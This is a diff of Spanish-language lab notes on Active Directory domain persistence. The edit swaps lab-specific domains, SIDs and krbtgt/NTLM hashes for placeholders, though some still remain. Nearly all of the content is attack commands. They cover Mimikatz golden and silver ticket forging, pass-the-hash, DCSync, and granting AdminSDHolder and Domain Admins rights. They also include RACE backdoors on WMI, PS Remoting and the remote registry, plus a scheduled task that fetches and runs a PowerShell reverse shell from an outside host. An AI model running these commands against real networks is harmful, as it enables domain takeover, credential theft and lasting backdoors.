@@ -19,17 +19,16 @@ Ejecutamos mimikatz en el DC para obtener el hash de krbtgt:
 
 En una máquina que puede llegar al CONTROLADOR DE DOMINIO a través de la red:
 
-`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`
+`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain: /sid: /krbtgt: /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`
 
 Usando SafetyKatz:
 
-`C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch" "exit"`
+`C:\SafetyKatz.exe "lsadump::lsa /patch" "exit"`
 
 En una máquina que puede llegar al CONTROLADOR DE DOMINIO a través de la red(necesita ejecutar como admin):
 
-`C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden 
-/User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 
-/krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
+`C:\BetterSafetyKatz.exe "kerberos::golden 
+/User:Administrator /domain: /sid: /krbtgt: /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
 
 ![images/Active%20Directory%20Domain%20Dominance/Untitled.png](images/Active%20Directory%20Domain%20Dominance/Untitled.png)
 
@@ -47,8 +46,7 @@ cuenta.
 Mediante el hash de la cuenta de equipo del controlador de dominio, a continuación el comando proporciona
 acceso a recursos compartidos en el controlador de dominio:
 
-`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:cifs
-/rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`
+`Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain: /sid: /target: /service:cifs /rc4: /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`
 
 Se puede utilizar un comando similar para cualquier otro servicio en un equipo. ¿Qué servicios? HOST, RPCSS, WSMAN y muchos más
 
@@ -61,21 +59,17 @@ Hay varias formas de conseguir RCE utilizando Silver Tickets:
 Crea un ticket plateado para el SPN HOST que nos permitirá programar una tarea en el target:
 
 `Invoke-Mimikatz -Command '"kerberos::golden 
-/User:Administrator /domain:us.techcorp.local /sid:S-1-
-5-21-210670787-2521448726-163245708 /target:usdc.us.techcorp.local /service:HOST
-/rc4:f4492105cb24a843356945e45402073e /id:500 
-/groups:512 /startoffset:0 /endin:600 /renewmax:10080 
+/User:Administrator /domain: /sid: /target: /service:HOST /rc4: /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 
 /ptt"'`
 
 Ejecuta la tarea:
 
-`schtasks /create /S us-dc.us.techcorp.local /SC Weekly
+`schtasks /create /S PCNAME /SC Weekly
 /RU "NT Authority\SYSTEM" /TN "STCheck" /TR
 "powershell.exe -c 'iex (New-Object 
-Net.WebClient).DownloadString(''http://192.168.100.X:808
-0/Invoke-PowerShellTcp.ps1''')'"`
+Net.WebClient).DownloadString(''http://IP:8080/Invoke-PowerShellTcp.ps1''')'"`
 
-`schtasks /Run /S us-dc.us.techcorp.local /TN "STCheck"`
+`schtasks /Run /S PCNAME /TN "STCheck"`
 
 **Domain Persistence - Skeleton Key**
 
@@ -138,8 +132,7 @@ Pero, el comportamiento de inicio de sesión para la cuenta DSRM debe cambiarse 
 
 Usamos este comando para hacer un pass the hash:
 
-`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0 
-/run:powershell.exe"'`
+`Invoke-Mimikatz -Command '"sekurlsa::pth /domain: /user:Administrator /ntlm:/run:powershell.exe"'`
 
 `ls \\us-dc\C$`
 
@@ -202,21 +195,21 @@ agregando un usuario con permisos completos (u otros permisos interesantes) al o
 Agregue permisos de FullControl para un usuario al AdminSDHolder usando PowerView como DA:
 
 `Add-DomainObjectAcl -TargetIdentity
-'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose`
+'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=local' -PrincipalIdentity username -Rights All -PrincipalDomain dominio -TargetDomain dominio -Verbose`
 
 Usando AD modulo y RACE toolkit:
 
 ([https://github.com/samratashok/RACE](https://github.com/samratashok/RACE))
 
-`Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose`
+`Set-ADACL -DistinguishedName 'DC=us,DC=,DC=local' -SamAccountName user -GUIDRight DCSync -Verbose`
 
 Otros permisos interesantes (ResetPassword, WriteMembers) para un usuario al AdminSDHolder:
 
 `Add-DomainObjectAcl -TargetIdentity
-'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights ResetPassword -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose`
+'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=local' -PrincipalIdentity user -Rights ResetPassword -PrincipalDomain domain -TargetDomain domain -Verbose`
 
 `Add-DomainObjectAcl -TargetIdentity
-'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights WriteMembers -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose`
+'CN=AdminSDHolder,CN=System,dc=us,dc=,dc=local' -PrincipalIdentity user -Rights WriteMembers -PrincipalDomain domain -TargetDomain domain -Verbose`
 
 Ejecute SDProp manualmente usando Invoke-SDPropagator.ps1 desde el directorio de Herramientas:
 
@@ -233,24 +226,24 @@ Verifique el permiso de administradores de dominio - PowerView como usuario norm
 ResolveGUIDs | ForEach-Object {$_ | Add-Member
 NoteProperty 'IdentityName' $(Convert-SidToName
 $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match
-"studentuser1"}`
+"User"}`
 
 AD module:
 
 `(Get-Acl -Path 'AD:\CN=Domain 
-Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match 'studentuser1'}`
+Admins,CN=Users,DC=us,DC=,DC=local').Access | ?{$_.IdentityReference -match 'user'}`
 
 Abusando de FullControl usando PowerView:
 
-`Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
+`Add-DomainGroupMember -Identity 'Domain Admins' -Members user -Verbose`
 
 AD module:
 
-`Add-ADGroupMember -Identity 'Domain Admins' -Members testda`
+`Add-ADGroupMember -Identity 'Domain Admins' -Members user`
 
 Abusando de Reseteo de contraseñas con PowerView:
 
-`Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
+`Set-DomainUserPassword -Identity user -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
 
 AD module:
 
@@ -266,29 +259,29 @@ Force) -Verbose`
 Añadir permisos FullControl :
 
 `Add-DomainObjectAcl -TargetIdentity
-"dc=us,dc=techcorp,dc=local" -PrincipalIdentity
-studentuser1 -Rights All -PrincipalDomain
-us.techcorp.local -TargetDomain us.techcorp.local -
+"dc=us,dc=,dc=local" -PrincipalIdentity
+User -Rights All -PrincipalDomain
+us.techcorp.local -TargetDomain domain -
 Verbose`
 
 Usando AD Module:
 
-`Set-ADACL -SamAccountName studentuser1 -
-DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right
+`Set-ADACL -SamAccountName user -
+DistinguishedName 'DC=us,DC=,DC=local' -Right
 GenericAll -Verbose`
 
 Añadiendo derechos para DCSync:
 
 `Add-DomainObjectAcl -TargetIdentity
-"dc=us,dc=techcorp,dc=local" -PrincipalIdentity
-studentuser1 -Rights DCSync -PrincipalDomain
-us.techcorp.local -TargetDomain us.techcorp.local -
+"dc=us,dc=,dc=local" -PrincipalIdentity
+User -Rights DCSync -PrincipalDomain
+Domain -TargetDomain domain -
 Verbose`
 
 Usando AD Module:
 
-`Set-ADACL -SamAccountName studentuser1 -
-DistinguishedName 'DC=us,DC=techcorp,DC=local' -
+`Set-ADACL -SamAccountName user -
+DistinguishedName 'DC=us,DC=,DC=local' -
 GUIDRight DCSync -Verbose`
 
 Ejecutamos DCSync:
@@ -298,7 +291,7 @@ Ejecutamos DCSync:
 
 o tambien con:
 
-`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync
+`C:\SafetyKatz.exe "lsadump::dcsync
 /user:us\krbtgt" "exit"`
 
 **Persistence using ACLs – Security Descriptors**
@@ -316,24 +309,24 @@ A; CI; CCDCLCSWRPWPRCWD ;;; SID
 
 Las ACL se pueden modificar para permitir que los usuarios que no son administradores accedan a objetos protegibles. Uso del kit de herramientas RACE:
 
-`C:\AD\Tools\RACE-master\RACE.ps1`
+`C:\RACE.ps1`
 
-En la maquina local de stundent:
+En la maquina local:
 
-`Set-RemoteWMI -SamAccountName studentuser1 –Verbose`
+`Set-RemoteWMI -SamAccountName user –Verbose`
 
-En una máquina remota para studentuser1 sin credenciales explícitas:
+En una máquina remota para user sin credenciales explícitas:
 
 `Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Verbose`
 
 En una máquina remota con credenciales explícitas. Solo root \ cimv2 y espacios de nombres anidados:
 
-`Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -
+`Set-RemoteWMI -SamAccountName user -ComputerName us-dc -
 Credential Administrator –namespace 'root\cimv2' -Verbose`
 
 En la máquina remota, elimine los permisos:
 
-`Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove`
+`Set-RemoteWMI -SamAccountName user -ComputerName us-dc -Remove`
 
 **PowerShell Remoting**
 
@@ -341,23 +334,23 @@ Uso del kit de herramientas RACE: la puerta trasera de PS Remoting no es estable
 
 En la maquina local de estudiante:
 
-`Set-RemotePSRemoting -SamAccountName studentuser1 –Verbose`
+`Set-RemotePSRemoting -SamAccountName user –Verbose`
 
-En una máquina remota para studentuser1 sin credenciales explícitas:
+En una máquina remota para user sin credenciales explícitas:
 
-`Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Verbose`
+`Set-RemotePSRemoting -SamAccountName user -ComputerName us-dc -Verbose`
 
 En la máquina remota, elimine los permisos:
 
-`Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Remove`
+`Set-RemotePSRemoting -SamAccountName user -ComputerName us-dc -Remove`
 
 **Remote Registry**
 
 Uso del kit de herramientas RACE, con admin priv en la maquina remota:
 
-`Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser1 -Verbose`
+`Add-RemoteRegBackdoor -ComputerName us-dc -Trustee user -Verbose`
 
-Como studentuser1, recupere el hash de la cuenta de la máquina:
+Como user, recupere el hash de la cuenta de la máquina:
 
 `Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose`
 
